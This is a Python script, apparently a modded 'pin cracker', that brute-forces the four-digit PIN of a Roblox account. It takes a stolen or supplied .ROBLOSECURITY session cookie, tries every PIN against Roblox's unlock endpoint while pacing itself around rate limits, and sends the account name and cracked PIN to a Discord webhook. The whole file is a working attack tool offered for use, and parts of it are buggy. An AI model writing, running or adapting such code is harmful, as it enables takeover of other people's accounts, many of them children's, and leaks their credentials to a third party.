import subprocess
import requests
import base64
import json
import time
import os

try:
    from termcolor import cprint
except ImportError:
    print("[", end="")
    print('\033[31m' + " ERROR ", "red", end="")
    print("] ", end="")
    print('\033[31m' + "Packages not installed. Installing now...")
    subprocess.call("pip install termcolor", shell=True)
finally:
    from termcolor import cprint

def is_cookie_valid(cookie):
    response = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": cookie})
    return response.status_code == 200

def load_progress():
    try:
        with open('progress.json', 'r') as f:
            return json.load(f).get('current_pin', 0)
    except FileNotFoundError:
        return 0

def save_progress(pin):
    with open('progress.json', 'w') as f:
        json.dump({'current_pin': pin}, f)

class Crack:
    def __init__(self):
        self.cookie = None
        self.webhook = None
        self.continueProgress = None
        self.start()

    def diagnose(self, error):
        uiprint = self.print
        uiprint(f"ERROR {error}", "error")
        try:
            cookie = self.cookie
            headers = {
                'X-CSRF-TOKEN': self.getXsrf(cookie),
            }
            print("[", end="")
            cprint(" ERROR ", "red", end="")
            print("] ", end="")
            cprint("Pin Bruteforcer Had A Fatal Error. Diagnosing issue", 'red')

            check = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies={'.ROBLOSECURITY': cookie})
            response = check.json()

            if check.status_code == 503:
                uiprint("Error found. Roblox is under maintenance", "error")
            elif response['errors'][0]['message'] == 'Authorization has been denied for this request.':
                uiprint("Error found. Invalid Cookie. Close the program then re-enter the cookie and try again", "error")
            elif response['errors'][0]['message'] == 'Token Validation Failed':
                uiprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the Roblox API endpoint.", "error")
            elif check.status_code == 404:
                uiprint("Error found. Roblox's API endpoint may have changed", "error")

            uiprint("Try re-running the program", 'error')
        except Exception as e:
            uiprint(f"Error occurred with the program or your computer: {e}", "error")

    def print(self, message=None, type=None):
        key = {
            "error": ["ERROR", "red"],
            "diagnostic": ["DIAGNOSTIC", "red"],
            "ratelimit": ["RATELIMITED", "yellow"],
            None: ["BRUTEFORCER", "magenta"],
        }

        if type in key:
            title = key[type][0]
            color = key[type][1]
        else:
            title = "BRUTEFORCER"
            color = type

        print("[", end="")
        cprint(f" {title} ", color, end="")
        print("] ", end="")
        if message:
            print(message)

    def getXsrf(self, cookie):
        xsrfRequest = requests.post("https://auth.roblox.com/v2/logout", cookies={'.ROBLOSECURITY': cookie})
        return xsrfRequest.headers["x-csrf-token"]

    def clear(self):
        os.system("cls" if os.name == 'nt' else "clear")

    def check(self):
        uiprint = self.print
        yes = ["y", "yes", "yeah", "ye"]

        uiprint(" Enter Your Cookie Below:")
        cookie = input("> ")
        if not is_cookie_valid(cookie):
            uiprint("Invalid Cookie", "error")
            exit()

        uiprint(" Enter Your Webhook Below:")
        webhook = input("> ")
        uiprint(" Continue progress from last time? (Y or N)")
        continueProgress = input("> ")
        continueProgress = continueProgress.lower() in yes

        self.cookie = cookie
        self.webhook = webhook
        self.continueProgress = continueProgress

    def start(self):
        uiprint = self.print
        print('\n\u001B[35m█▀█ █ █▄░█ ▄▄ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█\n█▀▀ █ █░▀█ ░░ █▄▄ █▀▄ █▀█ █▄▄ █░█ ██▄ █▀▄\u001B[37m\n================================================\n\t\u001B[31mPIN CRACKER | REMODDED BY: RAISHIN\t\u001B[37m \n================================================')

        time.sleep(1)
        os.system("clear")

        print('''[CRACKER STARTED]''')

        url = 'https://auth.roblox.com/v1/account/pin/unlock'
        xcrsf = requests.post('https://auth.roblox.com/v1/login', cookies={".ROBLOSECURITY": self.cookie}).headers['x-csrf-token']
        header = {'X-CSRF-TOKEN': xcrsf}

        start_time = time.time()
        current_pin = load_progress()

        for current_pin in range(current_pin, 10000):
            pin = str(current_pin).zfill(4)
            payload = {'pin': pin}
            r = requests.post(url, data=payload, headers=header, cookies={".ROBLOSECURITY": self.cookie})

            if 'unlockedUntil' in r.text:
                print(f'\u001B[32m[SUCCESSFULLY CRACKED] PIN:\u001B[37m  \u001B[34m {pin} \u001B[37m')
                username = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": self.cookie}).json()['name']
                data = {
                    "content": '@everyone' if self.continueProgress else 'Pin Successfully Cracked!',
                    "username": "Rai$hin - Pin Cracker",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1234384385310986241/1302569512192839680/Kokichi_Muta.png?ex=6729e964&is=672897e4&hm=decf67d5cf366b2098e60d6066533e24f54b5eb4cdc6bbe572460f04ac2e6a46&",
                    "embeds": [{
                        "description": f"{username}'s Pin:\n```{pin}```",
                        "title": "Cracked Pin!",
                        "color": 0x00ff00,
                    }]
                }
                requests.post(self.webhook, json=data)
                print("Webhook sent successfully.")
                break

            elif 'Too many requests made' in r.text:
                print('Rate limit exceeded. Please wait before trying again.')
                time.sleep(60)

            elif 'Authorization' in r.text:
                print('Error! Is the cookie valid?')
                break

            elif 'Incorrect' in r.text:
                print(f"\u001B[32m[TRIED]:\u001B[37m {pin}, \u001B[31mIncorrect!\u001B[37m")
                time.sleep(10)

            elif 'PIN limit reached' in r.text:
                print("\u001B[31m[PIN LIMIT REACHED] You have reached the maximum number of PIN attempts. Please try again later.\u001B[37m")
                break

            save_progress(current_pin)

        end_time = time.time()
        print(f"Cracking process completed in {end_time - start_time:.2f} seconds.")
        print("\u001B[32m[CRACKER FINISHED]\u001B[37m")

if __name__ == "__main__":
    try:
        Crack()
    except Exception as e:
        print(e)
        Crack.diagnose(e)
